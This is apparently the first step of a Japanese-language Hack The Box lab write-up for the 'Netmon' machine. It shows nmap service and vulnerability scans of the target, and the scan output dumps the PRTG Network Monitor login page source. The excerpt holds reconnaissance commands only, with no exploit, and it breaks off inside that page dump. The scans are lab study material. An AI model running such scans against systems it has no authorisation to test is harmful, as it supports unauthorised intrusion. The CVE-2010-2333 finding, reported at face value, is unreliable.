https://app.hackthebox.com/machines/Netmon

## STEP 1
FTPのAnonumousログインが許可されている  
また80番が開いてるね
```sh
└─$ nmap -n -Pn --top-ports=1000 -sV -sC --max-retries=0 10.129.230.176      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-16 07:10 EDT
Warning: 10.129.230.176 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.129.230.176
Host is up (0.29s latency).
Not shown: 885 closed tcp ports (reset), 109 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_11-10-23  10:20AM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-server-header: PRTG/18.1.37.13946
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -1s, deviation: 0s, median: -2s
| smb2-time: 
|   date: 2025-04-16T11:10:22
|_  start_date: 2025-04-16T10:34:26

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.57 seconds
```
80番で、CVE-2010-2333 を発見  
Source code disclosure で、index.phpを取得できたが大した情報はなさそう
```sh
└─$ nmap -n -Pn -p21,80,135,139,445,5985 --script=vuln 10.129.230.176 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-16 06:39 EDT
Nmap scan report for 10.129.230.176
Host is up (0.29s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-vuln-cve2010-0738: 
|_  /jmx-console/: Authentication was not required
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
| http-litespeed-sourcecode-download: 
| Litespeed Web Server Source Code Disclosure (CVE-2010-2333)
| /index.php source code:
| <!doctype html>\x0D
| <html class="">\x0D
| <!--\x0D
|  _____  _______ _______ _______ _______        _______  ______\x0D
| |_____] |_____| |______ |______ |______ |      |______ |_____/\x0D
| |       |     | |______ ______| ______| |_____ |______ |    \_\x0D
| \x0D
| We are hiring software developers! https://www.paessler.com/jobs\x0D
| \x0D
| -->\x0D
| <head>\x0D
|   <link rel="manifest" href="/public/manifest.json.htm">\x0D
|   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\x0D
|   <meta charset="utf-8">\x0D
|   <meta name="viewport" content="width=device-width,initial-scale=1">\x0D
|   <meta name='viewport' content='width=device-width, height=device-height, initial-scale=0.8'>\x0D
|   <link id="prtgfavicon" rel="shortcut icon" type="image/ico" href="/favicon.ico" />\x0D
|   <title>Welcome | PRTG Network Monitor (NETMON)</title>\x0D
|   <link rel="stylesheet" type="text/css" href="/css/prtgmini.css?prtgversion=18.1.37.13946__" media="print,screen,projection" />\x0D
| \x0D
|   \x0D
|   \x0D
| \x0D
|    \x0D
|    \x0D
|   \x0D
|   <script>\x0D(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){\x0D(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),\x0Dm=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)\x0D})(window,document,'script','//www.google-analytics.com/analytics.js','__ga');\x0D__ga('create', 'UA-154425-18', {\x0D'appId':'-10',\x0D'appName':'PRTG Network Monitor (NETMON)',\x0D'appVersion':'18.1.37.13946'\x0D});\x0D(function(){\x0D  var url =  document.createElement("a")\x0D    , urlStripOff = ["mapid", "tmpid", "subid", "topnumber", "username", "password", "email_address"];\x0D  window.__gaStripOrigin = function(urlString){\x0D    var param = [];\x0D    url.href = (""+urlString);\x0D    param = url.search.replace("?","").split("&");\x0D    param = param.filter(function(value){\x0D     return (value !== "" && urlStripOff.indexOf(value.split("=")[0]) === -1)\x0D    });\x0D return url.pathname + (param.length === 0 ? "" : "?" +  param.join("&"));\x0D};})();\x0D__ga("set", "location", "");\x0D__ga("set", "hostname", "trial.paessler.com");\x0D__ga("set","dimension4","0");\x0D__ga("set","dimension3","18.1.37.13946".split(".").slice(0,3).join("."));\x0D__ga("set","dimension2","2365");\x0D__ga("set","dimension1","webgui");\x0D</script>\x0D
| </head>\x0D
| <body id="mainbody" class="systemmenu loginscreen language_en">\x0D
| <!--\x0D
| //        You can use this file to modify the appearance of the PRTG web interface\x0D
| //        as described in https://kb.paessler.com/en/topic/33\x0D
| //        \x0D
| //        Please note that you are using an unsupported and deprecated feature. \x0D
| //        Your changes will be broken or removed with future PRTG updates.\x0D
| //        \x0D
| //        If you modify this file, PLEASE LET US KNOW what you're changing and why!\x0D
| //        Just drop an email to support@paessler.com and help us understand your \x0D
| //        needs. Thank you!       \x0D
| -->\x0D
| \x0D
| \x0D
| \x0D
| <div id="login-container">\x0D
| \x0D
|   <div class="login-form" style="">\x0D
|     <div class="login-cell box">\x0D
|             <div class="cell-left cell-login">\x0D
|             <h1>PRTG Network Monitor (NETMON)</h1>\x0D
|             <noscript>\x0D
|               <div style="margin-bottom:10px">\x0D
|                 <div class="nagscreen-box" >\x0D
|                   <p class="nagscreen-head">Javascript is not available!</p>\x0D
|                   <p class="nagscreen-cell">\x0D
|                     You cannot use the AJAX Web Interface without Javascript. <br>Javascript seems to be disabled or not supported by your browser.\x0D
|                   </p>\x0D
|                 </div>\x0D
|               </div>\x0D
|             </noscript>\x0D
|             <div id="notofficiallysupported" style="display:none" class="nagscreen-box">\x0D
|               <p class="nagscreen-head">\x0D
|                 Your browser is not officially supported!\x0D
|               </p>\x0D
|               <p class="nagscreen-cell">\x0D
|                 Some functionalities may not work correctly or not at all. Consider upgrading to a modern browser version. We recommend <a href='https://www.google.com/chrome/'>Chrome</a> or <a href='http://www.mozilla.org/firefox/'>Firefox</a>.\x0D
|               </p>\x0D
|             </div>\x0D
|             <div id="unsupportedbrowser" style="display:none;">\x0D
|               <div class="nagscreen-box" >\x0D
|                 <p class="nagscreen-head">\x0D
|                  Sorry, your browser is not supported!\x0D
|                 </p>\x0D
|                 <p class="nagscreen-cell">\x0D
|                   <b>You might not be able to access all PRTG features with this browser!</b><br>\x0D
|                   Please upgrade to a modern browser version. We recommend <a href='https://www.google.com/chrome/'>Chrome</a> or <a href='http://www.mozilla.org/firefox/'>Firefox</a>.\x0D
|                 </p>\x0D
|               </div>\x0D
|             </div>\x0D
|             <div id="dontuselocalhost" style="display:none;">\x0D
|               <div class="nagscreen-box" >\x0D
|                 <p class="nagscreen-head">\x0D
|                   Please do not use http://localhost to access the PRTG web server!\x0D
|                 </p>\x0D
|                 <p class="nagscreen-cell">\x0D
|                   This may considerably slow down the PRTG web interface on some browsers. Use your IP or DNS name instead.\x0D
|                 </p>\x0D
|               </div>\x0D
|             </div>\x0D
|             <form id="loginform" class="loginform" accept-charset="UTF-8" action="/public/checklogin.htm" method="post" >\x0D
|                     <input id="hiddenloginurl" type="hidden" name="loginurl" value="***">\x0D
|                 <p class="login-error"><div class="errormessage"></div></p>\x0D
|                 <div class="controlgroup">\x0D
|                 <label for="loginusername">Login&nbsp;Name</label>\x0D
|                 <input tabindex="1" autofocus class="text" id="loginusername" name="username" type="text" value=""  />\x0D
|                 </div>\x0D
| \x0D
|                 <div class="controlgroup">\x0D
|                 <label for="loginpassword">Password</label>\x0D
|                 <input tabindex="1" class="text" id="loginpassword" name="password" type="password" value=""  />\x0D
|                 </div>\x0D
|                 <p class="buttonbar">\x0D
|                       <button class="loginbutton button big" type="submit">Login</button>\x0D
|                 </p>\x0D
|             </form>\x0D
|                 <span class="downloadclients">\x0D
|                     <a class="nohjax" href="/downloads.htm">Download Client Software (optional, for Windows, iOS, Android)</a>\x0D
|                 </span>\x0D
| \x0D
|                 <span class="forgotpw">\x0D
|                     <a class="nohjax" href="/public/forgotpassword.htm">Forgot password?</a>\x0D
| \x0D
|                     <a target="_blank" href="/help/login.htm#login">Need Help?</a>\x0D
|                 </span>\x0D
|             </div>\x0D
|           <div class="cell-left cell-news" style="">\x0D
|             <div class="logo-box">\x0D
|             <img class="prtg-logo-big" width="250" height="150" src="/images/prtg_logo_gray.png" />\x0D
|             </div>\x0D
|             \x0D
|         </div>\x0D
|         <div class="cell-left cell-banner">\x0D
|             \x0D
|             <div><h2>Thank you for using PRTG Network Monitor</h2>\x0D
| \x0D
|                 <p>You are using the Freeware version of <a href='https://www.paessler.com?utm_source=prtg&utm_medium=referral&utm_campaign=webgui-freeware'>PRTG Network Monitor</a>. We're glad to help you cover all aspects of the current state-of-the-art <a href='https://www.paessler.com/network_monitoring?utm_source=prtg&utm_medium=referral&utm_campaign=webgui-freeware'>network monitoring!</a>.\x0D
|                 PRTG Network Monitor enables you to monitor <a href='https://www.paessler.com/uptime_monitoring?utm_source=prtg&utm_medium=referral&utm_campaign=webgui-freeware'>uptime </a>,\x0D
|                 <a href='https://www.paessler.com/bandwidth_monitoring?utm_source=prtg&utm_medium=referral&utm_campaign=webgui-freeware'>traffic and bandwidth usage</a> with only one tool. You can also create comprehensive data reports with the integrated reporting and analysis features. This makes PRTG a clear and simple monitoring solution for your entire network.</p>\x0D
|                 <p>The software runs 24/7 to monitor your network. All you need is a computer with a Windows operating system. PRTG includes everything that you need in one installator, so you can start monitoring your network right away. The Software records bandwidth and network usage and stores the data in an integrated high-performance database.\x0D
|                 Add all the network devices that you want to monitor via an easy-to-use web-based user interface and configure sensors that retrieve the desired data.\x0D
|                 You can create usage reports and provide colleagues\x0D
|                 and customers access to data graphs and tables according a sensible user management.\x0D
|                 </p>\x0D
|                 <p> PRTG supports all common protocols to get network data: <a href='https://www.paessler.com/prtg7/infographic/?utm_source=prtg&utm_medium=referral&utm_campaign=webgui-freeware'>Simple Network Management Protocol (SNMP), Windows Management Instrumentation (WMI)</a>,\x0D
|                 <a href='https://www.paessler.com/packet_sniffing?utm_source=prtg&utm_medium=referral&utm_campaign=webgui-freeware'>Packet Sniffing</a>,\x0D
|                 <a href='https://www.paessler.com/netflow_monitoring?utm_source=prtg&utm_medium=referral&utm_campaign=webgui-freeware'>Cisco NetFlow</a> and other vendor specific flow protocols, as well as SSH, SOAP, and many other network protocols.</p><p>\x0D
|                 PRTG Network Monitor provides about 200 sensor types so you can start monitoring your standard systems directly after installation.\x0D
|                 These include monitoring Ping times, HTTP pages, SMTP, POP3, and IMAP mail servers, FTP servers, Linux systems, and many other hardware components and network services.\x0D
|                 You can easily monitor the performance of your network permanently to recognize imminent outages before they occur. In the case of an error, you will receive emails, SMS, or push messages immediately.\x0D
|                 PRTG constantly records performance data and downtimes in the database so you can compile reports about performance, downtimes, and SLAs at any time.\x0D
|                 </p>\x0D
|                 <p>The <a href='https://www.paessler.com/prtg?utm_source=prtg&utm_medium=referral&utm_campaign=webgui-freeware'>Freeware Edition</a> of PRTG Network Monitor is completely free for personal and commercial use.\x0D
|                 If you want to complete your monitoring or have larger networks, use one of our <a href='https://www.paessler.com/order?utm_source=prtg&utm_medium=referral&utm_campaign=webgui-freeware'>Commercial Editions</a> that provide you with a suitable license.</p>\x0D
|                 <p><b>More about <a href='https://www.paessler.com/prtg?utm_source=prtg&utm_medium=referral&utm_campaign=webgui-freeware'>PRTG Network Monitor</a> and <a href='https://www.paessler.com?utm_source=prtg&utm_medium=referral&utm_campaign=webgui-freeware'>Paessler - The Network Monitoring Company</a>.</b></p></div>\x0D
|             </div>\x0D
|     </div>\x0D
|   </div>\x0D
| \x0D
|   <div class="footer">\x0D
|         <span class="paesslerlogo">\x0D
|       <a href="https://www.paessler.com?utm_source=prtg&utm_medium=referral&utm_campaign=webgui-homepage" target="_blank" title="Paessler AG - The Network Monitoring Company"><img border=0 id="paesslerlogo" src="/images/paessler.png"></a>\x0D
|     </span>\x0D
|     <span class="prtgversion">&nbsp;PRTG Network Monitor 18.1.37.13946 </span>\x0D
|     <span class="copyright">&copy; 2018 <a href="https://www.paessler.com?utm_source=prtg&utm_medium=referral&utm_campaign=webgui-homepage" target="_blank" title="The Network Monitoring Company">Paessler AG</a></span>\x0D
|   </div>\x0D
| </div>\x0D
| <script>\x0D
|   var actualBrowserInclude = {\x0D
|     "current": {\x0D
|         "desktop": {\x0D
|             "c": 58.0,\x0D
|             "f": 53.0,\x0D
|             "i": 12.0,\x0D
|             "o": 44.0,\x0D
|             "pale moon": 27.0,\x0D
|             "s": 10.0,\x0D
|             "vivaldi": 1.10,\x0D
|             "yandex": 17.04,\x0D
|             "ios":10.3,\x0D
|             "e":14.0,\x0D
|             "i":14.0,\x0D
|             "iOS": 10.3,\x0D
|             "a": 700,\x0D
|             "uc": 11.03\x0D
|         },\x0D
|         "mobile": {\x0D
|             "android": 0,\x0D
|             "c": 55,\x0D
|             "f": 50.0,\x0D
|             "o": 37.0\x0D
|         }\x0D
|     }\x0D
| }\x0D
| // prebuild action on bmx\x0D
| // this file should be downloaded and updated from\x0D
| // https://github.com/browser-update/browser-update/browser.json\x0D
| \x0D
| ;\x0D
|   (function(window, document, undefined){\x0D
| //(c)2017, MIT Style License <browser-update.org/LICENSE.txt>\x0D
| //https://github.com/browser-update/browser-update/blob/master/update.js\x0D
| //unmodified\x0D
| if (window.nocheck) {\x0D
|     return\x0D
| }\x0D
| function $bu_getBrowser(ua_str) {\x0D
|     var n,t,ua=ua_str||navigator.userAgent,donotnotify=false;\x0D
|     var names={i:'Internet Explorer',e:"Edge",f:'Firefox',o:'Opera',s:'Safari',n:'Netscape',c:"Chrome",a:"Android Browser", y:"Yandex Browser",v:"Vivaldi",uc:"UC Browser",x:"Other"};\x0D
|     function ignore(reason,pattern){if (RegExp(pattern,"i").test(ua)) return reason;}\x0D
|     var ig=ignore("bot","bot|spider|archiver|transcoder|crawl|checker|monitoring|screenshot|python-|php|uptime|validator|fetcher|facebook|slurp|google|yahoo|microsoft|node|mail.ru|github|cloudflare|addthis|thumb|proxy|feed|fetch|favicon|link|http|scrape|seo|page|search console|AOLBuild|Teoma|Gecko Expeditor")||\x0D
|         ignore("discontinued browser","camino|flot|k-meleon|fennec|galeon|chromeframe|coolnovo") ||\x0D
|         ignore("complicated device browser","SMART-TV|SmartTV") ||\x0D
|         ignore("niche browser","Dorado|Whale|SamsungBrowser|MIDP|wii|Chromium|Puffin|Opera Mini|maxthon|maxton|dolfin|dolphin|seamonkey|opera mini|netfront|moblin|maemo|arora|kazehakase|epiphany|konqueror|rekonq|symbian|webos|PaleMoon|QupZilla|Otter|Midori|qutebrowser") ||\x0D
|         ignore("mobile without upgrade path or landing page","kindle|silk|blackberry|bb10|RIM|PlayBook|meego|nokia|ucweb|ZuneWP7|537.85.10") ||\x0D
|         ignore("android(chrome) web view","; wv");\x0D
|     var mobile=(/iphone|ipod|ipad|android|mobile|phone|ios|iemobile/i.test(ua));\x0D
|     if (ig)\x0D
|         return {n:"x",v:0,t:"other browser",donotnotify:ig};\x0D
| \x0D
|     var pats=[\x0D
|         ["CriOS.VV","c"],\x0D
|         ["FxiOS.VV","f"],\x0D
|         ["Trident.*rv:VV","i"],\x0D
|         ["Trident.VV","io"],\x0D
|         ["UCBrowser.VV","uc"],\x0D
|         ["MSIE.VV","i"],\x0D
|         ["Edge.VV","e"],\x0D
|         ["Vivaldi.VV","v"],\x0D
|         ["OPR.VV","o"],\x0D
|         ["YaBrowser.VV","y"],\x0D
|         ["Chrome.VV","c"],\x0D
|         ["Firefox.VV","f"],\x0D
|         ["Version.VV.*Safari","s"],\x0D
|         ["Safari.VV","so"],\x0D
|         ["Opera.*Version.VV","o"],\x0D
|         ["Opera.VV","o"],\x0D
|         ["Netscape.VV","n"]\x0D
|     ];\x0D
|     for (var i=0; i <pats.length; i++) {\x0D
|         if (ua.match(new RegExp(pats[i][0].replace("VV","(\\d+\\.?\\d+)"),"i"))) {\x0D
|             n=pats[i][1];\x0D
|             break;\x0D
|         }\x0D
|     }\x0D
|     var semver=n==="v"||n==="y"||n==="uc";\x0D
|     if (semver) {//zero pad semver for easy comparing\x0D
|         var parts = (RegExp.$1).split('.');\x0D
|         var v=(parts[0] + "." + ("00".substring(0, 2 - parts[1].length) + parts[1]));\x0D
|     }\x0D
|     else {\x0D
|         var v=Math.round(parseFloat(RegExp.$1)*10)/10;\x0D
|     }\x0D
| \x0D
|     if (!n)\x0D
|         return {n:"x",v:0,t:(names[n]||"unknown"),mobile:mobile};\x0D
| \x0D
|     //do not notify old systems since there is no up-to-date browser available\x0D
|     if (/windows.nt.5.0|windows.nt.4.0|windows.95|windows.98|os x 10.2|os x 10.3|os x 10.4|os x 10.5|os x 10.6|os x 10.7/i.test(ua))\x0D
|         donotnotify="oldOS";\x0D
| \x0D
|     //iOS\x0D
|     if (/iphone|ipod|ipad|ios/i.test(ua)) {\x0D
|         ua.replace("_",".").match(new RegExp("OS.(\\d+\\.?\\d?)","i"));//\x0D
|         n="iOS";\x0D
|         v=parseFloat(RegExp.$1);\x0D
|         var h = Math.max(window.screen.height, window.screen.width);\x0D
|         if (h<=480 || window.devicePixelRatio<2) //iphone <5 and old iPads  // (h>568 -->iphone 6+)\x0D
|               return {n:"s",v:v,t:"iOS "+v,donotnotify:"iOS without upgrade path",mobile:mobile};\x0D
|         return {n:"s",v:v,t:"iOS "+v,donotnotify:false,mobile:mobile};//identify as safari\x0D
|     }\x0D
|     //check for android stock browser\x0D
|     if (ua.indexOf('Android')>-1 && n==="s") {\x0D
|         var ver=parseInt((/WebKit\/([0-9]+)/i.exec(ua) || 0)[1],10) || 2000;\x0D
|         if (ver <= 534)\x0D
|             return {n:"a",v:ver,t:names["a"],mob:true,donotnotify:donotnotify,mobile:mobile};\x0D
|         //else\x0D
|         //    return {n:n,v:v,t:names[n]+" "+v,donotnotify:"mobile on android",mobile:mobile};\x0D
|     }\x0D
| \x0D
|     //do not notify firefox ESR\x0D
|     if (n=="f" && (Math.round(v)==45 || Math.round(v)==52))\x0D
|         donotnotify="ESR";\x0D
| \x0D
|     if (n=="so") {\x0D
|         v=4.0;\x0D
|         n="s";\x0D
|     }\x0D
|     if (n=="i" && v==7 && window.XDomainRequest) {\x0D
|         v=8;\x0D
|     }\x0D
|     if (n=="io") {\x0D
|         n="i";\x0D
|         if (v>6) v=11;\x0D
|         else if (v>5) v=10;\x0D
|         else if (v>4) v=9;\x0D
|         else if (v>3.1) v=8;\x0D
|         else if (v>3) v=7;\x0D
|         else v=9;\x0D
|     }\x0D
|     if (n=="e") {\x0D
|         return {n:"i",v:v,t:(names[n]||"unknown")+" "+v,donotnotify:donotnotify,mobile:mobile};\x0D
|     }\x0D
|     return {n:n,v:v,t:(names[n]||"unknown")+" "+v,donotnotify:donotnotify,mobile:mobile};\x0D
|       }\x0D
| //(c)2017, MIT Style License <browser-update.org/LICENSE.txt>\x0D
| //https://github.com/browser-update/browser-update/blob/master/update.js\x0D
| //\x0D
|   $buo = function(op, test) {\x0D
|     var jsv = 24;\x0D
|     var n = window.navigator;\x0D
|     var b;\x0D
|     var vsdefault = { i: 11, f: -4, o: -4, s: -2, n: 12, c: -4, a: 534, y: -1, v: -0.2 };\x0D
|     var vsmin = { i: 11, f: 10, o: 20, s: 7, n: 12, c: 33};\x0D
|     var vs = {x: 9999999};\x0D
|     var akt = actualBrowserInclude;\x0D
|     var vsakt = {};\x0D
|     var ls = !!localStorage && localStorage.getItem("browsercheck");\x0D
|     if(ls !== null){\x0D
|       if(ls === "false")\x0D
|         return;\x0D
|       else if(typeof(ls) === "string"){\x0D
|         try{\x0D
|           ls = JSON.parse(ls);\x0D
|         }catch(e){\x0D
|           ls = false;\x0D
|         }\x0D
|       }\x0D
|       if(ls !== false && !!ls.l && !!ls.b){\x0D
|         $bu_show(ls.l,ls.b);\x0D
|         return;\x0D
|       }\x0D
|     }\x0D
|     akt = akt.current.desktop;\x0D
|     this.op = op || {};\x0D
| \x0D
|         vsakt["c"] = akt["c"];\x0D
|         vsakt["f"] = akt["f"];\x0D
|         vsakt["i"] = akt["i"];\x0D
|         vsakt["o"] = akt["o"];\x0D
|         vsakt["s"] = akt["s"];\x0D
|         vsakt["e"] = akt["e"];\x0D
| \x0D
|     for (b in vsdefault) {\x0D
|       if (!vs[b]) vs[b] = vsdefault[b];\x0D
|       if (vsakt[b] && vs[b] >= vsakt[b]) vs[b] = vsakt[b] - 0.2;\x0D
|       if (vsakt[b] && vs[b] <0) vs[b] = vsakt[b] + vs[b];\x0D
|       if (vsmin[b] && vs[b] <vsmin[b]) vs[b] = vsmin[b];\x0D
|     }\x0D
| \x0D
|     this.op.onshow = op.onshow || function(o) {};\x0D
|     this.op.onclick = op.onclick || function(o) {};\x0D
|     this.op.onclose = op.onclose || function(o) {};\x0D
| \x0D
|     var bb = $bu_getBrowser(test);\x0D
|     if (!bb\x0D
|       || !bb.n\x0D
|       || (document.cookie.indexOf("browserupdateorg=pause") > -1 && this.op.reminder > 0)\x0D
|       || bb.v >= vs[bb.n]\x0D
|       || (bb.mobile && op.mobile === false)\x0D
|      ){\x0D
|                //!!test && !!console && console.log("Browser OK", bb, vs)\x0D
|                       return;\x0D
|     }\x0D
| \x0D
|     if (this.op.nomessage) {\x0D
|       op.onshow(this.op);\x0D
|       return;\x0D
|     }\x0D
|     var ll = op.l || (n.languages ? n.languages[0] : null) || n.language || n.browserLanguage || n.userLanguage || document.documentElement.getAttribute("lang") || "en";\x0D
|     ll = ll.replace("_","-").toLowerCase().substr(0,2);\x0D
| \x0D
|     $bu_show(ll, bb)\x0D
| \x0D
|   };\x0D
|   function $bu_show(ll,bb){\x0D
|     var t = {};\x0D
|     t.en = '<b>Your web browser (%s) is out of date</b>. For more security, comfort and the best experience on this site: <a%s>Update your browser</a> <a%s>Ignore</a>';\x0D
|     t.de = '<b>Ihr Browser (%s) ist veraltet</b>. Aktualisieren sie ihren Browser f\xC3\xBCr mehr Sicherheit, Komfort und die einwandfreie Nutzung dieser Webseite. <a%s>Browser aktualisieren</a> <a%s>Ignorieren</a>';\x0D
|     t.it = '<b>Il tuo browser (%s) non \xC3\xA8 aggiornato</b>. Ha delle falle di sicurezza e potrebbe non visualizzare correttamente le pagine di questo e altri siti. <a%s>Actualice su navegador</a> <a%s>Chiudi</a>';\x0D
|     t.pl = 'Przegl\xC4\x85darka (%s), kt\xC3\xB3rej u\xC5\xBCywasz, jest przestarza\xC5\x82a. Posiada ona udokumentowane <b>luki bezpiecze\xC5\x84stwa, inne wady</b> oraz <b>ograniczon\xC4\x85 funkcjonalno\xC5\x9B\xC4\x87</b>. Tracisz mo\xC5\xBCliwo\xC5\x9B\xC4\x87 skorzystania z pe\xC5\x82ni mo\xC5\xBCliwo\xC5\x9Bci oferowanych przez niekt\xC3\xB3re strony internetowe. <a%s>Dowiedz si\xC4\x99 jak zaktualizowa\xC4\x87 swoj\xC4\x85 przegl\xC4\x85dark\xC4\x99</a>.';\x0D
|     t.es = '<b>Su navegador (%s) no est\xC3\xA1 actualizado</b>. Tiene fallos de seguridad conocidos y podr\xC3\xADa no mostrar todas las caracter\xC3\xADsticas de este y otros sitios web. <a%s>Averig\xC3\xBCe c\xC3\xB3mo actualizar su navegador.</a> <a%s>Cerrar</a>';\x0D
|     t.nl = 'Uw browser (%s) is <b>oud</b>. Het heeft bekende <b>veiligheidsissues</b> en kan <b>niet alle mogelijkheden</b> weergeven van deze of andere websites. <a%s>Lees meer over hoe uw browser te upgraden</a>';\x0D
|     t.pt = '<b>Seu navegador (%s) est\xC3\xA1 desatualizado</b>. Ele possui falhas de seguran\xC3\xA7a e pode apresentar problemas para exibir este e outros websites. <a%s>Veja como atualizar o seu navegador</a> <a%s>Fechar</a>';\x0D
|     t.sl = 'Va\xC5\xA1 brskalnik (%s) je <b>zastarel</b>. Ima ve\xC4\x8D <b>varnostnih pomankljivosti</b> in morda <b>ne bo pravilno prikazal</b> te ali drugih strani. <a%s>Poglejte kako lahko posodobite svoj brskalnik</a>';\x0D
|     t.ru = '\xD0\x92\xD0\xB0\xD1\x88 \xD0\xB1\xD1\x80\xD0\xB0\xD1\x83\xD0\xB7\xD0\xB5\xD1\x80 (%s) <b>\xD1\x83\xD1\x81\xD1\x82\xD0\xB0\xD1\x80\xD0\xB5\xD0\xBB</b>. \xD0\x9E\xD0\xBD \xD0\xB8\xD0\xBC\xD0\xB5\xD0\xB5\xD1\x82 <b>\xD1\x83\xD1\x8F\xD0\xB7\xD0\xB2\xD0\xB8\xD0\xBC\xD0\xBE\xD1\x81\xD1\x82\xD0\xB8 \xD0\xB2 \xD0\xB1\xD0\xB5\xD0\xB7\xD0\xBE\xD0\xBF\xD0\xB0\xD1\x81\xD0\xBD\xD0\xBE\xD1\x81\xD1\x82\xD0\xB8</b> \xD0\xB8 \xD0\xBC\xD0\xBE\xD0\xB6\xD0\xB5\xD1\x82 <b>\xD0\xBD\xD0\xB5 \xD0\xBF\xD0\xBE\xD0\xBA\xD0\xB0\xD0\xB7\xD1\x8B\xD0\xB2\xD0\xB0\xD1\x82\xD1\x8C \xD0\xB2\xD1\x81\xD0\xB5 \xD0\xB2\xD0\xBE\xD0\xB7\xD0\xBC\xD0\xBE\xD0\xB6\xD0\xBD\xD0\xBE\xD1\x81\xD1\x82\xD0\xB8</b> \xD0\xBD\xD0\xB0 \xD1\x8D\xD1\x82\xD0\xBE\xD0\xBC \xD0\xB8 \xD0\xB4\xD1\x80\xD1\x83\xD0\xB3\xD0\xB8\xD1\x85 \xD1\x81\xD0\xB0\xD0\xB9\xD1\x82\xD0\xB0\xD1\x85. <a%s>\xD0\xA3\xD0\xB7\xD0\xBD\xD0\xB0\xD0\xB9\xD1\x82\xD0\xB5, \xD0\xBA\xD0\xB0\xD0\xBA \xD0\xBE\xD0\xB1\xD0\xBD\xD0\xBE\xD0\xB2\xD0\xB8\xD1\x82\xD1\x8C \xD0\x92\xD0\xB0\xD1\x88 \xD0\xB1\xD1\x80\xD0\xB0\xD1\x83\xD0\xB7\xD0\xB5\xD1\x80</a>';\x0D
|     t.id = 'Browser Anda (%s) sudah <b>kedaluarsa</b>. Browser yang Anda pakai memiliki <b>kelemahan keamanan</b> dan mungkin <b>tidak dapat menampilkan semua fitur</b> dari situs Web ini dan lainnya. <a%s> Pelajari cara memperbarui browser Anda</a>';\x0D
|     t.uk = '\xD0\x92\xD0\xB0\xD1\x88 \xD0\xB1\xD1\x80\xD0\xB0\xD1\x83\xD0\xB7\xD0\xB5\xD1\x80 (%s) <b>\xD0\xB7\xD0\xB0\xD1\x81\xD1\x82\xD0\xB0\xD1\x80\xD1\x96\xD0\xB2</b>. \xD0\x92\xD1\x96\xD0\xBD <b>\xD1\x83\xD1\x80\xD0\xB0\xD0\xB7\xD0\xBB\xD0\xB8\xD0\xB2\xD0\xB8\xD0\xB9</b> \xD0\xB9 \xD0\xBC\xD0\xBE\xD0\xB6\xD0\xB5 <b>\xD0\xBD\xD0\xB5 \xD0\xB2\xD1\x96\xD0\xB4\xD0\xBE\xD0\xB1\xD1\x80\xD0\xB0\xD0\xB6\xD0\xB0\xD1\x82\xD0\xB8 \xD0\xB2\xD1\x81\xD1\x96 \xD0\xBC\xD0\xBE\xD0\xB6\xD0\xBB\xD0\xB8\xD0\xB2\xD0\xBE\xD1\x81\xD1\x82\xD1\x96</b> \xD0\xBD\xD0\xB0 \xD1\x86\xD1\x8C\xD0\xBE\xD0\xBC\xD1\x83 \xD0\xB9 \xD1\x96\xD0\xBD\xD1\x88\xD0\xB8\xD1\x85 \xD1\x81\xD0\xB0\xD0\xB9\xD1\x82\xD0\xB0\xD1\x85. <a%s>\xD0\x94\xD1\x96\xD0\xB7\xD0\xBD\xD0\xB0\xD0\xB9\xD1\x82\xD0\xB5\xD1\x81\xD1\x8C, \xD1\x8F\xD0\xBA \xD0\xBE\xD0\xBD\xD0\xBE\xD0\xB2\xD0\xB8\xD1\x82\xD0\xB8 \xD0\x92\xD0\xB0\xD1\x88 \xD0\xB1\xD1\x80\xD0\xB0\xD1\x83\xD0\xB7\xD0\xB5\xD1\x80</a>';\x0D
